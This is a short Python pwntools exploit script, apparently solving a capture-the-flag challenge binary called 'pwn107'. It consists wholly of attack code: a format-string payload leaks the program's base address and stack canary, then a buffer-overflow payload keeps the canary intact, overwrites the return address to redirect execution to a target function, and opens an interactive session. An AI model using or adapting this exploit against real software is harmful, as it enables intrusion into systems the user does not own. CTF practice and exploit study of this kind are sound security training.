#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn107.pwn107", checksec=False)

REMOTE_IP="10.10.2.126"
PORT=9007

p = remote(REMOTE_IP, PORT) if args.REMOTE else process(binary.path)

payload = b""
payload += b"%11$p %13$p"

p.sendlineafter(b"What's your last streak? ", payload)

p.recvuntil(b"Your current streak: ")
result = [int(x,16) for x in p.recvline().split()]

image_base = result[0] - 0x780
canary = result[1]

payload = b""
payload += 0x18 * b"A"
payload += p64(canary)
payload += 0x8 * b"A"
payload += p64(binary.sym.get_streak + image_base + 1)

p.clean()
p.sendline(payload)

p.interactive()
